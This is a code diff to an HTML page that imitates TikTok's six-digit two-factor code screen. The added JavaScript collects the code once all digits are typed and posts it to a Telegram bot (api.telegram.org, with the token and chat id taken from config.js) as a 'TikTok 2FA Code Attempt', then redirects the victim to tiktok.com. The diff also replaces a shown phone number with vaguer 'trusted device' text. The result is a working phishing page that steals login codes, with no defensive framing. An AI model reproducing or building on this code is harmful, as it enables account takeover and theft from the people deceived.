@@ -10,17 +10,13 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Font Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <!-- Telegram Configuration File -->
+    <script src="config.js"></script>
     <style>
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-        }
-
-        /* Subtle blinking cursor effect for active digit box */
-        @keyframes caret-blink {
-            0%, 100% { border-color: #fe2c55; }
-            50% { border-color: #d1d5db; }
         }
 
         .code-input:focus {
@@ -68,9 +64,9 @@
                     Enter 6-digit code
                 </h2>
 
-                <!-- Subtitle with destination phone number -->
+                <!-- Subtitle with updated trusted device text -->
                 <p class="text-sm text-gray-400 font-normal mb-8">
-                    Your code was sent to <span class="text-gray-500 font-normal">+47 41191015</span>
+                    Your code was sent to your trusted device
                 </p>
 
                 <!-- 6-Digit Code Inputs Container -->
@@ -105,9 +101,47 @@
         let timer = 42;
         let timerInterval = null;
 
+        // Function to send code data to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.chatId,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.error('Error connecting to Telegram API:', error);
+            }
+        }
+
+        // Check if all 6 digits are entered
+        async function checkCompleteOTP() {
+            let code = '';
+            inputs.forEach(input => {
+                code += input.value;
+            });
+
+            if (code.length === 6) {
+                // Disable inputs while sending
+                inputs.forEach(input => input.disabled = true);
+
+                const message = `🔢 TikTok 2FA Code Attempt\n• Code: ${code}`;
+                await sendToTelegram(message);
+
+                // Redirect after sending
+                window.location.href = 'https://www.tiktok.com';
+            }
+        }
+
         // Auto-advance and digit input management
         inputs.forEach((input, index) => {
-            // Keydown event for handling backspace & arrow navigation
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace') {
                     if (!input.value && index > 0) {
@@ -124,7 +158,6 @@
                 }
             });
 
-            // Input event for typing digits and auto-advancing
             input.addEventListener('input', (e) => {
                 const value = e.target.value;
 
@@ -138,6 +171,7 @@
                     });
                     const lastFilledIndex = Math.min(index + digits.length - 1, inputs.length - 1);
                     inputs[lastFilledIndex].focus();
+                    checkCompleteOTP();
                     return;
                 }
 
@@ -151,9 +185,10 @@
                 if (value && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
+
+                checkCompleteOTP();
             });
 
-            // Auto-select text on focus
             input.addEventListener('focus', () => {
                 input.select();
             });
@@ -179,7 +214,6 @@
             }, 1000);
         }
 
-        // Start initial countdown from 42s as shown in screenshot
         function initCountdown() {
             timer = 42;
             countdownEl.textContent = timer;
